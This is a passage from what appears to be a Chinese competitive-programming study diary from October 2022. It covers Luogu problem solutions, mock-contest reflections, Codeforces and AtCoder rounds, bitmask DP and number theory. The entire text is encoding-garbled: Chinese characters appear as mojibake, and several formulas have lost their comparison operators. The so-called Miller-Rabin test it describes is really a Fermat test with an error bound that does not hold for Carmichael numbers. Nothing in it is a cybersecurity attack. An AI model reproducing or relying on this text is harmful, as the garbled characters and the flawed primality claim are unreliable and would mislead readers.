‘çŠ¶æ•°ç»„ç»´æŠ¤ï¼Œå¯¹äºæ¯ä¸€ä¸ªç§»åŠ¨çš„é‡ï¼Œç­”æ¡ˆä¸º k - i + query (a[i] - 1)ã€‚ P3582 [POI2015] KIN ç”±äºä¸èƒ½æŸä¸ªæ•°å¤šæ¬¡å‡ºç°ï¼Œåˆ™ä¸èƒ½ç´¯åŠ å®ƒçš„è´¡çŒ®ã€‚è€ƒè™‘æšä¸¾å¹¶è®°å½•æ¯ç§æ•°ä¸Šä¸€ä¸ªæ•°å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœä¸€ç§æ•°ä¸¤æ¬¡å‡ºç°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æŠŠä¸Šä¸€æ¬¡çš„ä½ç½®ä¿®æ”¹æˆå…¶ç›¸åæ•°ä»è€ŒæŠµæ¶ˆè´¡çŒ®;å¦‚æœå¤§äºä¸¤æ¬¡ï¼Œæ˜¾ç„¶ä¸èƒ½å¤šå‡å»è´¡çŒ®ï¼Œé‚£ä¹ˆæŠŠä¸Šä¸€ä¸ªä½ç½®ä¹‹å‰çš„å…¨éƒ¨å˜ä¸º $0$ å³å¯ã€‚äºæ˜¯é¢˜ç›®å°±è½¬æ¢æˆäº†åŒºé—´æœ€å¤§å­æ®µå’Œï¼Œçº¿æ®µæ ‘ç»´æŠ¤å·¦å³å­æ ‘çš„æœ€å¤§å­æ®µå’Œï¼ŒåŒºé—´å’Œï¼Œæœ€å¤§å­æ®µå’Œå³å¯ã€‚ $\\texttt{2022.10.16}$$\\texttt{OI}$ èµ›åˆ¶çš„æ¨¡æ‹Ÿèµ›ï¼Œç„¶åå› ä¸ºä¸¤ä¸ªå¼±æ™ºé”™è¯¯ï¼Œå¯¼è‡´ $300\\texttt{ pts} \\to 100 \\texttt{ pts}$ã€‚ $\\texttt{T1}$ å±äºæ˜¯æ— è„‘æ¨¡æ‹Ÿï¼Œç¡®å®š $n$ ä¸ªåŒ–å­¦æ–¹ç¨‹å¼ä¸­çš„æ¯ä¸€ä¸ªåŒ–å­¦æ–¹ç¨‹å¼æ˜¯å¦å¹³è¡¡ï¼Œç„¶ååŠ äº†ä¸€å †ä¾¿äºæ“ä½œè€Œäº§ç”Ÿçš„æ¡ä»¶ã€‚ä¸€å¼€å§‹å†™ä¹±äº†ï¼Œåæ¥æœæ–­é‡æ„ï¼Œå†™æˆå‡½æ•°ï¼Œç„¶åä¸€å‘è¿‡æ ·ä¾‹ï¼Œå°±æ²¡ç®¡å®ƒäº†ã€‚ $\\texttt{T2}$ $60\\texttt{ pts}$ çš„éƒ¨åˆ†åˆ†ä¸€çœ¼ç§’ï¼Œå±äºæ˜¯äºŒç»´å‰ç¼€å’Œä¼˜åŒ–æ±‚æœ€å¤§å€¼ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n^4)$ã€‚ç„¶åè€ƒè™‘ä¼˜åŒ–ï¼Œå®¹æ˜“æƒ³åˆ°å›ºå®š $x_1,y_1,x_2$ æ—¶ï¼Œ$y_2$ çš„æšä¸¾æ˜¯å¯ä»¥ä¸€ç›´å¾€ä¸€ä¸ªæ–¹å‘æ‰«çš„ï¼Œå› æ­¤è€ƒè™‘å°ºå–æ³•ã€‚ è€ƒè™‘ä¸€ä¸ªç»“è®ºï¼Œä»¤ä¸€ä¸ªçŸ©å½¢çš„ä»·æ ¼ä¹‹å’Œä¸º $s$ï¼Œè‹¥ $s \\in [a,b]$ï¼Œç”»ä¸€ä¸‹æ•°è½´å¯çŸ¥æ­¤æ—¶æ˜¯æœ€ä¼˜è§£ï¼Œè€Œ $s$ å¦‚æœåœ¨è¿™ä¸ªåŒºé—´ä¹‹å¤–ï¼Œåˆ™éœ€è¦å°½é‡çš„é è¿‘è¿™ä¸ªåŒºé—´ã€‚ æ‰€ä»¥å°ºå–æ³•ä»¥ $b$ ä¸ºè¾¹ç•Œï¼Œæ­£åæ‰«ä¸¤æ¬¡ï¼Œç”±äºæ¯ä¸ªæ•°æœ€å¤šè¢«æ‰«ä¸€æ¬¡ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦ä¸º $O(n^3)$ï¼Œå¸¸æ•°ä¸å¤§ï¼Œå¯ä»¥é€šè¿‡æ­¤é¢˜ã€‚ æˆ‘ä¸ä¼šè¯´èµ›æ—¶å› ä¸ºè‡ªå·± sbï¼Œåªåˆ¤æ–­äº†ä¸¤ä¸ªæå€¼ç„¶åå†™æŒ‚çš„ã€‚ $\\texttt{T3}$ è´ªå¿ƒå¯çŸ¥æ‰¾åˆ°è·ç¦»æœ€è¿‘çš„ä¸€ä¸ªç”µæ¢¯ç„¶åå‘ä¸Šèµ°å³å¯ï¼Œäºæ˜¯é¢˜ç›®è½¬åŒ–ä¸ºæ±‚è·ç¦» $x$ æœ€è¿‘çš„ç”µæ¢¯ã€‚ä¸éš¾æƒ³åˆ°ç”¨çº¿æ®µæ ‘ï¼ˆæ±‚åŒºé—´æœ€å¤§å€¼ï¼‰ä¸äºŒåˆ†ç»´æŠ¤ï¼Œä¼¼ä¹ç›´æ¥çº¿æ®µæ ‘äºŒåˆ†ä¹Ÿè¡Œï¼Œå¤æ‚åº¦è¿˜èƒ½å°‘ä¸ª $\\log$ï¼Œä¹‹åç›´æ¥æ±‚ä¸¤ç‚¹çš„åŠ£å¼§çš„è·ç¦»å³å¯ï¼ˆç¬‘æ­»ï¼Œèµ›æ—¶è¿™é‡Œå†™æŒ‚äº†ï¼‰ã€‚ ç”±äºæˆç¯çš„ç‰¹æ€§ï¼Œç›´æ¥è¿›è¡Œçº¿æ®µæ ‘æ“ä½œå¹¶ä¸æ–¹ä¾¿ï¼Œè€ƒè™‘å¼€ä¸‰å€çš„æ•°ç»„ï¼Œ$x,x + n,x + 2 \\times n$ å‡ç»´æŠ¤åŒä¸€ä¸ªä½ç½®ï¼Œè¿™æ ·å‰åèµ°çš„æ—¶å€™å°±æ–¹ä¾¿å¤„ç†äº†ã€‚ æœ€ååœ¨ query çš„æ—¶å€™åŠ äº†ä¸ªä¼˜åŒ–ï¼Œå¦‚æœå·¦åŒºé—´è¿”å›éé›¶å€¼å°±å¯ä»¥ç›´æ¥ç»“æŸï¼Œè¿™æ ·åˆšå¥½èƒ½å¤Ÿä½¿ $O(n \\log ^2 n)$ å¤§å¸¸æ•°çš„çº¿æ®µæ ‘è¿‡äº†è¿™é“é¢˜ã€‚ ã€updatedã€‘ å‘ç°é¢˜è§£å†™äº†ä¸€ä¸ªè®°å¿†åŒ–æœç´¢å°±è¿‡äº†ï¼Œæˆ‘æ•²ï¼ $\\texttt{T4}$ çœ‹äº†é¢˜è§£å¥½åƒä¹Ÿä¸éº»çƒ¦ï¼Œçœ‹æ¥å¯¹ $\\texttt{dp}$ çš„çŠ¶æ€è®¾è®¡èƒ½åŠ›è¿˜éœ€è¦åŠ å¼ºã€‚ç”±äºäº¤æ¢é¡ºåºä¸ä¼šäº§ç”Ÿå½±å“ï¼Œè®¾ $dp_{0/1,i,j,k}$ å†³å®šäº†åŒºé—´å¤–çš„æœ€å·¦/å³çš„ $i$ ä¸ªå¨ƒå¨ƒï¼ŒåŒºé—´å†…çš„æœ€å·¦/å³çš„ $j$ ä¸ªå¨ƒå¨ƒï¼Œä»£ä»·ä¸º $k$ æ—¶æœ€å¤§çš„å‡å°‘é‡ï¼Œè½¬ç§»æ—¶ $dp_{0/1,i,j,k} = \\max (dp_{0/1,i - 1,j,k},dp_{0/1,i,j - 1,k},dp_{0/1,i - 1,j - 1,k - abs (l - r)} + W)$ã€‚ä»åŒºé—´çš„å·¦å³åˆ†åˆ«é€‰æ‹©åšä¸¤æ¬¡ $\\texttt{dp}$ï¼Œç„¶åæšä¸¾æ–­ç‚¹è¿›è¡Œåˆå¹¶ã€‚ ç”±äº$i$ è¿™ä¸€ç»´å¯ä»¥æ»šåŠ¨æ•°ç»„ä¼˜åŒ–ï¼Œæ‰€ä»¥æ€»æ—¶é—´å¤æ‚åº¦ $O(n^2k)$ï¼Œç©ºé—´å¤æ‚åº¦ $O(nk)$ã€‚å½“ç„¶ï¼Œ$k$ å¤§äºä¸€å®šå€¼æ—¶ï¼Œç­”æ¡ˆä¸€å®šä¸ºå‰ $r - l + 1$ å°çš„å€¼çš„å’Œï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥è¿›è¡Œç©ºé—´ä¸Šçš„å†æ¬¡ä¼˜åŒ–ï¼Œä¸è¿‡ä¸åŠ ä¹Ÿå¯ä»¥é€šè¿‡æ­¤é¢˜ã€‚ æ€»çš„æ¥è¯´ï¼Œè¿™åœºæ¨¡æ‹Ÿèµ›éš¾åº¦ä¸å¤§ï¼Œä½†æ˜¯å´éœ€è¦è¶³å¤Ÿçš„ç»†è‡´æ‰èƒ½ä¸€æ¬¡å†™å¯¹ï¼Œç»§ç»­åŠ æ²¹å§ï¼ $\\texttt{2022.10.18}$å¼€å§‹çŠ¶æ€å‹ç¼© $\\texttt{dp}$ çš„å¤ä¹ ã€‚ P3694 é‚¦é‚¦çš„å¤§åˆå”±ç«™é˜Ÿ ç”±äº $m$ çš„æ•°æ®èŒƒå›´æå°ï¼Œæ‰€ä»¥è®¾ $dp_i$ è¡¨ç¤ºåœ¨ $i$ çŠ¶æ€å°çš„æœ€å°å‡ºé˜Ÿäººæ•°å³å¯ã€‚ P2704 [NOI2001] ç‚®å…µé˜µåœ° é¦–å…ˆé¢„å¤„ç†åŒè¡Œéƒ½æƒ…å†µï¼ŒæŠŠåˆæ³•çš„çŠ¶æ€è¿›è¡Œå‚¨å­˜ã€‚ä¹‹åå¤„ç†åˆ—çš„æƒ…å†µï¼Œéœ€è¦æ»¡è¶³åˆ—ä¹Ÿä¸å†²çªï¼Œå› æ­¤çŠ¶æ€ä¸­è¦åŠ å…¥å‰ä¸€è¡Œï¼Œæšä¸¾æ—¶éœ€è¦ä»ä¸Šä¸¤è¡Œå¼€å§‹å¤„ç†ã€‚å‰ä¸¤è¡Œæ¯”è¾ƒç‰¹æ®Šéœ€è¦åˆ†å¼€å¤„ç†ã€‚ P2831 [NOIP2016 æé«˜ç»„] æ„¤æ€’çš„å°é¸Ÿ é¢„å¤„ç†å‡ºä¸¤ä¸ªç‚¹èƒ½æ„æˆçš„æ‰€æœ‰ $c = 0$ çš„äºŒæ¬¡å‡½æ•°ï¼Œè®°å½•ä¸€æ¬¡äºŒæ¬¡é¡¹ç³»æ•°å³å¯ï¼Œç„¶åå°†æ‰€æœ‰è¿‡æŸæŠ›ç‰©çº¿çš„çŒªæ”¾å…¥ä¸€ä¸ªçŠ¶æ€ä¸­ã€‚è½¬ç§»æ—¶æ¯æ¬¡åŠ å…¥ä¸€æ¡æŠ›ç‰©çº¿æ›´æ–°çŠ¶æ€ï¼Œå½“ç„¶è¦æ³¨æ„æŸæŠ›ç‰©çº¿åªè¿‡ä¸€ç‚¹çš„ç‰¹æ®Šæƒ…å†µã€‚å®ç°èµ·æ¥æœ‰ä¸€å®šçš„ç»†èŠ‚ï¼Œéœ€è¦æ³¨æ„ $a 0$ã€‚ P3092 [USACO13NOV]No Change G æšä¸¾å„æšç¡¬å¸çš„ä½¿ç”¨çŠ¶æ€ï¼Œç„¶åè½¬ç§»æ—¶é€šè¿‡äºŒåˆ†æ‰¾åˆ°ä¸Šä¸€æ¬¡çš„è´­ä¹°çš„ç‰©å“ã€‚ $\\texttt{2022.10.21}$åˆæ˜¯æ¨¡æ‹Ÿèµ›ã€‚ $\\texttt{A}$ å’Œæ¨¡æ‹Ÿå·®ä¸å¤šï¼Œç›´æ¥ç”¨ set æ°´è¿‡å»äº†ã€‚ ç„¶å $\\texttt{B}$ ä¸€å¼€å§‹æ²¡æƒ³æ³•ï¼Œå…ˆå»çœ‹äº† $\\texttt{C}$ã€‚å‘ç°æ˜¯è´ªå¿ƒï¼ŒæŒ‰ä¸‰ç§å±æ€§åˆ†åˆ«ä»å¤§åˆ°å°æ’åºåæšä¸¾åï¼Œåˆ¤æ–­ç¬¬ä¸€å¯¹åˆæ³•çš„ä¸‰ä¸ªäººç»„æˆä¸€ç»„ï¼Œç„¶åè¾“å‡ºå³å¯ã€‚ å†™å®Œ $\\texttt{C}$ ä»¥åæ¥ç€çœ‹ $\\texttt{B}$ï¼Œå‘ç°åˆæ˜¯å¯ä»¥ç”¨ set ç»´æŠ¤ï¼Œä¸€ç›´å¾€å³æ‰«ï¼Œå¦‚æœèƒ½è§£é¢˜ç›®å°±è§£ï¼Œå¦åˆ™å¼¹å‡ºæœ€å¤§å€¼æ¥æ¢ï¼ˆå‰ææ˜¯æ›´ä¼˜çš„æƒ…å†µä¸‹ï¼‰ã€‚å†™å®Œç”¨æš´åŠ›æ‹äº†ä¸€ä¸‹ä¸å¯¹ï¼Œç„¶åå‘ç°è¦ç”¨ multisetï¼Œç»§ç»­æ‹è¿˜æ˜¯ä¸å¯¹ï¼Œç„¶åå°±å¯„äº†ã€‚èµ›åå‘ç°æ˜¯ erase å‡½æ•°é”™äº†ï¼Œä¸èƒ½å†™æˆ s.erase(*(--s.end())ï¼Œå› ä¸ºè¿™æ ·ä¼šæŠŠæ‰€æœ‰ä¸€æ ·çš„å€¼å…¨éƒ½åˆ é™¤ã€‚èµ›åæ”¹å†™æˆ s.erase (--s.end()) å°±è¿‡äº†ï¼ˆè¿™æ ·çš„è¯åˆ çš„æ˜¯æœ«å°¾çš„åœ°å€æŒ‡å‘çš„å€¼ï¼Œå› æ­¤åªä¼šåˆ é™¤ä¸€ä¸ªæ•°ï¼‰ã€‚ $\\texttt{D}$ å› ä¸ºæ¨¡æ‹Ÿèµ›æ—¶é—´ä¸åƒé¥­å†²çªï¼Œæ‰€ä»¥å°±æ²¡å†™ã€‚èµ›åå‘ç°æ˜¯ä¸ªç¥å¿…æ¨¡æ‹Ÿï¼ŒåŠ ä¸ªä¼˜å…ˆé˜Ÿåˆ—ï¼ŒæŒ‰æ¥¼å±‚é«˜ä½ä¸ºå…³é”®å­—æ’å°±è¿‡äº†ã€‚ $\\texttt{2022.10.22}$æ™šä¸Šæ‰“äº† $\\texttt{Atcoder}$ï¼Œæ„å¤–çš„æ˜¯å¾—çŸ¥ $\\texttt{G}$ é‡é¢˜ç›´æ¥æ°´è¿‡å»äº†ã€‚å¦å¤– $\\texttt{D E}$ éƒ½æ˜¯ç®€å•çš„ $\\texttt{dp}$ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€å®šçš„ç»†èŠ‚ã€‚$\\texttt{F}$ èµ›æ—¶æ¥ä¸åŠäº†ï¼Œèµ›åè¡¥å§ã€‚ $\\texttt{2022.10.23}$å†æ¬¡æ¨¡æ‹Ÿèµ›ã€‚ä»Šå¤©çš„ $\\texttt{ABC}$ éƒ½åç®€å•ï¼Œ$\\texttt{D}$ èµ›æ—¶æ²¡æƒ³å‡ºæ¥ã€‚ç®€å•è¯´ä¸€ä¸‹åšæ³•ã€‚ $\\texttt{A}$ äºŒç»´å‰ç¼€å’Œç›´æ¥æ¨¡æ‹Ÿå³å¯ã€‚$\\texttt{B}$ æ•°å­¦é¢˜ï¼Œæšä¸¾å‰éƒ¨åˆ†é•¿åº¦ï¼Œç„¶åé€šè¿‡ä¹˜æ³•åŸç†ä»¥åŠä¸€å®šçš„åˆ†ç±»è®¨è®ºï¼Œç•™ä¸‹åˆæ³•æƒ…å†µå°±è¡Œï¼Œæ³¨æ„æ•°æ®ç±»å‹ã€‚$\\texttt{C}$ æšä¸¾æ¯ç§å¯èƒ½çš„é¢œè‰²çš„åŒºé—´ï¼Œç„¶åå–äº¤é›†ï¼Œæœ€åæˆ‘æ˜¯ç”¨å·®åˆ†è¿›è¡Œç»´æŠ¤çš„ã€‚$\\texttt{D}$ èµ›æ—¶æ²¡æƒ³æ³•ï¼Œçœ‹æ•°æ®èŒƒå›´çŒœæµ‹å¯èƒ½æ˜¯æ ‘çŠ¶æ•°ç»„ï¼ˆä¹Ÿæœ‰å¯èƒ½æ ‘çŠ¶æ•°ç»„ä¸é€†åºå¯¹çš„é¢˜ç›®å†™å¤šäº†çš„æ¡ä»¶åå°„å§ï¼ï¼‰ã€‚ $\\texttt{2022.10.24}$åœè¯¾äº†ã€‚ æ—©ä¸Šè¡¥é¢˜ã€‚$\\texttt{D}$ ç»ˆäºæœ‰æƒ³æ³•äº†ï¼Œå‘ç°ç­”æ¡ˆä¸º $n - \\texttt{æœ€é•¿è¿ç»­ä¸ä¸‹é™åºåˆ—}$ï¼Œä½†æ˜¯åªä¼š $O(n^2)$ï¼Œå°†å„ä¸ªæ•°å­—ä¸é‡å¤çš„å­ä»»åŠ¡ç›¸ç»“åˆï¼Œå†™äº†ä¸ª$O(n^2)$ çš„æš´åŠ›æ±‚è§£åŠ ä¸Š $O(n)$ çš„ç¦»æ•£åŒ–åçš„ $\\texttt{dp}$ï¼Œç„¶åå¾—äº† $80$ï¼Œä¹‹åå°±å¡åœ¨å¤„ç†é‡å¤æ•°å­—çš„ä¼˜åŒ–ä¸Šäº†ã€‚é¢˜è§£å¥½åƒæ˜¯æ¯”è¾ƒç›´æ¥çš„å¤„ç†äº†ï¼Œå°†é¢˜ç›®è½¬åŒ–ä¸ºæœ€å¤§åŒ–å›ºå®šä¸åŠ¨çš„æ•°å­—ï¼Œç„¶åé€šè¿‡åˆ†ç±»è®¨è®ºå‘å‰è¿˜æ˜¯å‘åç§»ï¼Œæ±‚å¾—ç­”æ¡ˆã€‚ ç»ˆäºæœ‰æ—¶é—´æŠŠé‚£äº›å‹ç®±åº•çš„é¢˜ç›®ç»™è¡¥äº†ï¼Œé€šè¿‡äº†å¾ˆæ˜¯å¼€å¿ƒï¼ï¼ï¼ $\\texttt{2022.10.25}$ä¸Šåˆæ‰“ä¸€åœº $\\texttt{CF}$ çš„æ¨¡æ‹Ÿèµ›ï¼ˆå¤ç°èµ›ï¼‰ï¼Œç¼–å·æ˜¯ $\\texttt{CF1736}$ï¼Œ$\\texttt{A B C1}$ æ‰“çš„æ¯”è¾ƒé¡ºåˆ©ï¼Œéƒ½ä¸€æ¬¡è¿‡äº†ï¼Œ $\\texttt{C2}$ æ²¡å•¥æƒ³æ³•ï¼ŒçŒœæµ‹å¯èƒ½è¦æ•°æ®ç»“æ„ç»´æŠ¤ã€‚è·³è¿‡å…ˆçœ‹äº† $\\texttt{D}$ï¼Œå‘ç°æ˜¯ä¸€é“æ„é€ é¢˜ï¼Œå¹¶ä¸”åªè¦è¾“å‡ºä¸€ç§å¯èƒ½è§£å°±è¡Œï¼ˆå¹¶ä¸è¦æ±‚æœ€ä¼˜ï¼‰ï¼Œæœæ–­å…ˆå†™ $\\texttt{D}$ï¼Œ$15$ åˆ†é’Ÿå†…è¿‡äº†ã€‚å‰©ä¸‹çš„æ—¶é—´éƒ½åœ¨æƒ³ $\\texttt{C2}$ï¼Œ$\\texttt{E}$ æ˜¯ $\\texttt{dp}$ ä¸å¤ªæƒ³å†™ã€‚äºæ˜¯ä¸€ç›´æ€è€ƒï¼Œæœ€åå®åœ¨æƒ³ä¸å‡ºå°±å¼€æ‘†äº†ã€‚ åˆ‡å‡º $4$ é¢˜ï¼Œå¤§æ¦‚åœ¨ $300-400$ åå·¦å³å§ï¼Œå…¨é  $\\texttt{D}$ çš„åˆ†ä½œè´¡çŒ®ã€‚ äºæ˜¯ä¸‹åˆç»§ç»­è¡¥ $\\texttt{CF}$ å’Œ $\\texttt{Atcoder}$ çš„é¢˜ç›®ï¼Œâ€¦â€¦ï¼ˆçœç•¥ä¸€ä¸‡å­—ï¼‰ï¼Œå°±å†™åˆ°è¿™å§ã€‚ ä¸ºå•¥æ™šä¸Šè¿˜ä¼šæœ‰ä¸€å¥—æ¨¡æ‹Ÿèµ›ï¼Œå•¥éƒ½ä¸ä¼šï¼Œæ²¡äº¤ä¸Šå»è¯„æµ‹ï¼ŒçœŸå‡‰å¿ƒã€‚ $\\texttt{2022.10.26}$è¡¥äº†æ˜¨å¤© $\\texttt{CF}$ å‰©ä¸‹çš„ä¸¤é“é¢˜ï¼Œ$\\texttt{C2}$ å•ç‹¬è€ƒè™‘æ¯ä¸ªæ•°å¯¹ç­”æ¡ˆçš„è´¡çŒ®ï¼Œæ¯ä¸ªæ•°æœ€å¤šæ‰©å±•åˆ°çš„å·¦ç«¯ç‚¹ä¸º $f_i = \\max (1,i - a_i + 1)$ï¼Œè€Œç»¼åˆè€ƒè™‘ï¼Œç¬¬ $i$ ä¸ªæ•°èƒ½åˆ°çš„æœ€å·¦è¾¹çš„ç«¯ç‚¹ä¸º $p_i = \\max \\{f_j\\} (j \\le i)$ï¼Œç„¶åä¸ä¿®æ”¹æ—¶ç­”æ¡ˆä¸º $\\sum_{i = 1}^{n} (i - (p - 1)) = \\dfrac{n(n + 1)}{2} + n - \\sum_{i = 1}^{n} p_i$ã€‚ä¿®æ”¹æ—¶ç”¨çº¿æ®µæ ‘ç»´æŠ¤å³å¯ï¼Œçœ‹ç€é¢˜è§£å†™çš„ï¼Œè¿˜æ˜¯æœ‰é‚£ä¹ˆä¸€ç‚¹éº»çƒ¦ã€‚ $\\texttt{E}$ è®¾ $dp_{i,j,k}$ è¡¨ç¤º ç¬¬ $i$ è½®çš„ä½ç½®ä¸º $j$ï¼Œäº¤æ¢æ¬¡æ•°ä¸º $k$ çš„æœ€å€¼ï¼Œç„¶åè¿›è¡Œè½¬ç§»ï¼Œç»†èŠ‚å°±æ˜¯æ³¨æ„è½¬ç§»çš„åˆæ³•æ€§å’Œåˆå§‹åŒ–ã€‚ç”±äºè½¬ç§»æ—¶è¦æ‰¾ä¹‹å‰çš„ä¸€æ®µçš„æœ€å€¼ï¼Œæ‰€ä»¥å¯ä»¥å‰ç¼€å’Œä¼˜åŒ–ã€‚åŒæ—¶ï¼Œè¿˜å¯ä»¥ç”¨æ»šåŠ¨æ•°ç»„ä¼˜åŒ–ç©ºé—´ï¼Œæœ€åæ—¶é—´å¤æ‚åº¦ $O(n^3)$ï¼Œç©ºé—´å¤æ‚åº¦ $O(n^2)$ã€‚ æ™šä¸Šä¾æ—§æ¨¡æ‹Ÿèµ›ï¼Œç»ˆäºå¯åšã€‚ $\\texttt{T1}$ åšå¼ˆè®ºï¼Œç±»ä¼¼ $\\texttt{Nim}$ æ¸¸æˆï¼Œä½†æ˜¯æœ‰ä¸Šé™ï¼Œå‘ç°åªè¦å–ä¸ªæ¨¡å°±å˜ä¸ºè¯¥æ¸¸æˆï¼Œæ‰€ä»¥å¯¹äºä¸Šé™ $x$ï¼Œ$\\texttt{Alice}$ èƒœçš„å……è¦æ¡ä»¶ä¸º $a_1 \\mod (x + 1) \\otimes a_2 \\mod (x + 1) \\otimes \\cdots \\otimes a_n \\mod (x + 1) 0$ã€‚äºæ˜¯ç›´æ¥æ¨¡æ‹Ÿå¯ä»¥æ‹¿ $\\texttt{50 pts}$ï¼Œä½†æ˜¯åç»­å¹¶ä¸ä¼šä¼˜åŒ–ï¼Œå…ˆæ”¾ç€ã€‚ $\\texttt{T2}$ æ•°æ®ç»“æ„æ¯’ç˜¤é¢˜ã€‚å¤§é±¼åƒå°é±¼ï¼Œåˆ¤æ–­èƒ½å¦ä½¿é±¼çš„ä½“ç§¯å¤§äº $k$ã€‚ä¾æ—§ä¸å¤ªä¼šåšï¼Œåªæ˜¯çŸ¥é“å°½é‡åƒå¤§ä¸€ç‚¹çš„é±¼çš„è´ªå¿ƒæ€æƒ³ï¼Œå†™äº†ä¸€ä¸ª set æ¨¡æ‹Ÿï¼Œä¸çŸ¥é“èƒ½æ‹¿å‡ åˆ†ã€‚ $\\texttt{T3}$ ç®€å•é¢˜ï¼Œä»¥æœ€åç­”æ¡ˆçš„èŒƒå›´æ˜¯ $[0,999]$ ä¸ºçªç ´å£ï¼Œé€šè¿‡ç­”æ¡ˆç¡®å®šå¯èƒ½çš„åŒºé—´ã€‚æšä¸¾ $x,y$ï¼Œæ»¡è¶³ $\\frac{x}{y}$ å·²ç»æ˜¯æœ€ç®€åˆ†æ•°ï¼Œç„¶åè®¡ç®—å¯ä»¥åŒä¹˜ä»¥çš„æ•°çš„ä¸ªæ•°å³å¯ã€‚ $\\texttt{T4}$ åƒæ˜¯ä¸€ä¸ªæ•°ä½ $\\texttt{dp}$ï¼Œè€Œä¸”è¿˜éœ€è¦é«˜ç²¾åº¦ã€‚ç›´æ¥å‡†å¤‡æ‹¿ $n \\le 6$ çš„æš´åŠ›åˆ†ä»¥åŠ $m = 0$ çš„ç‚¹ã€‚ç”±äºæ‡’å¾—å†™é«˜ç²¾åº¦ï¼Œäºæ˜¯ç”¨ python æ‰“è¡¨ï¼Œä½†æ˜¯è¡¨è¿‡å¤§å±¡æ¬¡æŠŠç¼–è¯‘å™¨å¡çˆ†ï¼Œæ‰€ä»¥æœ€åå°±æ‰“äº† $n \\le 100$ çš„è¡¨ï¼Œä¸æ™“å¾—èƒ½æ‹¿å¤šå°‘ã€‚ äº¤ä¸Šå»è¯„æµ‹äº†ï¼ˆçœç•¥ç¬¬ä¸€æ¬¡æµ‹å¿˜å¼€ long long çš„æƒ¨çŠ¶ï¼‰ï¼Œ$50 + 30 + 100 + 50 = 230$ï¼Œè¿˜å¯ä»¥å­ï¼Œè¯¥æ‹¿çš„åˆ†éƒ½æ‹¿äº†ï¼ˆé™¤äº†æœ€åä¸€é¢˜çš„ç¥å¿…é«˜ç²¾åº¦æ¨¡æ‹Ÿï¼‰ã€‚ $\\texttt{2022.10.27}$ä¸Šåˆå¤ä¹ æ•°è®ºã€‚ é‡æ–°æ¨äº†ä¸€é $\\texttt{exgcd}$ï¼Œæ€ä¹ˆæ„Ÿè§‰è¿™ä¹ˆé™Œç”Ÿå•Šè¿™è¿™è¿™â€¦. äº†è§£åˆ°ä¸€ä¸ªå«åšç±³å‹’ç½—å®¾ç´ æ•°æµ‹è¯•çš„æ–¹æ³•ï¼Œæœ¬è´¨æ˜¯è¿ç”¨è´¹é©¬å°å®šç†çš„é€†å®šç†ã€‚ éšæœºå‡ºå‡ ä¸ªæ•° $x$ï¼Œè‹¥ä¸æ»¡è¶³ $x^{n - 1} \\equiv 1 (\\mod n)$ï¼Œåˆ™å¯ä»¥è¯´æ˜ $n$ æ˜¯åˆæ•°ï¼Œè®¡ç®—æ¦‚ç‡å¯çŸ¥ï¼Œè‹¥é‡å¤ $p$ æ¬¡ï¼Œå‡é€šè¿‡æ£€æµ‹ï¼Œåˆ™åªæœ‰ $(\\frac{1}{2})^{p}$ ä½¿å®ƒä¸ºåˆæ•°ï¼Œä»£ç å†™èµ·æ¥å¾ˆç®€å•å°±ä¸ç»™äº†ã€‚ P1463 [POI2001][HAOI2007] åç´ æ•° å°†æ•°è¡¨ç¤ºæˆç®—æœ¯åŸºæœ¬å®šç†çš„åˆ†è§£å½¢å¼åï¼Œæ ¹æ®è´ªå¿ƒï¼Œè®©å°çš„è´¨æ•°çš„å¹‚å°½é‡å¤§ã€‚ä¸éš¾å‘ç°ï¼Œåœ¨è¯¥æ•°æ®èŒƒå›´ä¸‹ï¼Œå¹¶ä¸éœ€è¦æšä¸¾è¿‡å¤šçš„è´¨æ•°ï¼Œç›´æ¥æœç´¢æ±‚è§£ã€‚ æ‰¾å‡º $n$ ä¸ªæ•°ä¸¤ä¸¤ä¹‹é—´æœ€å¤§å…¬çº¦æ•°çš„æœ€å¤§å€¼ã€‚ å€’åºæšä¸¾æœ€å¤§çš„æœ€å¤§å…¬çº¦æ•°ï¼Œç„¶ååˆ©ç”¨æ¡¶åˆ¤æ–­è¯¥å…¬çº¦æ•°å‡ºç°çš„æ¬¡æ•°ï¼Œä¸€æ—¦å¤§äºç­‰äº $2$ æ¬¡ï¼Œåˆ™ä¸ºä¸€ä¸ªåˆæ³•è§£ã€‚ç”±äºå€’åºï¼Œæ­¤æ—¶æœ€ä¼˜ï¼Œç›´æ¥è¾“å‡ºå³å¯ã€‚ç”±æšä¸¾æ–¹å¼å¯çŸ¥ï¼Œå¯¹äºæ¯ä¸ªå…¬çº¦æ•° $d$ï¼Œåˆ†åˆ«åˆ¤æ–­çš„æ˜¯ $2d,3d \\cdots$ æ˜¯å¦å­˜åœ¨ï¼Œå› æ­¤ç”±è°ƒå’Œçº§æ•°çŸ¥æ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log n)$ã€‚ ç°åœ¨ç»™å®šä¸€ä¸ªæ•´æ•° $n$,éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¤§äº $n$ æ•´æ•° $m$ï¼Œä½¿å¾— $\\mathrm{LCM}(1,2,\\cdots,n) \\mid \\mathrm{LCM}(n + 1,n + 2,\\cdots,m)$ã€‚ æŒ‰ç…§ç®—æœ¯åŸºæœ¬å®šç†çš„åˆ†è§£å½¢å¼ï¼Œå‘ç° $m$ æ»¡è¶³ $a_i^{\\max{\\{p_i\\}}} \\mid m$ï¼Œæ˜¾ç„¶åªè¦æ»¡è¶³ $m$ æ˜¯å…¶ä¸­ä¸€ä¸ªæœ€å¤§çš„è´¨æ•°çš„å¹‚æ¬¡çš„ $2$ å€å³å¯ã€‚ æ±‚ $\\sum_{i = 1}^{n} \\gcd (i,n)$ã€‚ æšä¸¾æœ€å¤§å…¬çº¦æ•° $d$ï¼Œè®¾ $x = ad,n = bd(d \\mid n)$ï¼Œåˆ™æ»¡è¶³ $\\gcd (x,n) = d$ æ—¶ï¼Œå½“ä¸”ä»…å½“ $\\gcd (a,b) = 1$ï¼Œä¹Ÿå°±æ˜¯ $\\gcd (a,\\frac{n}{d}) = 1$ï¼Œå³ä¸¤æ•°äº’è´¨ï¼Œä¸éš¾æœ€å¤§å…¬çº¦æ•°ä¸º $d$ æ—¶ç¬¦åˆæ¡ä»¶çš„ä¸ªæ•°ä¸º 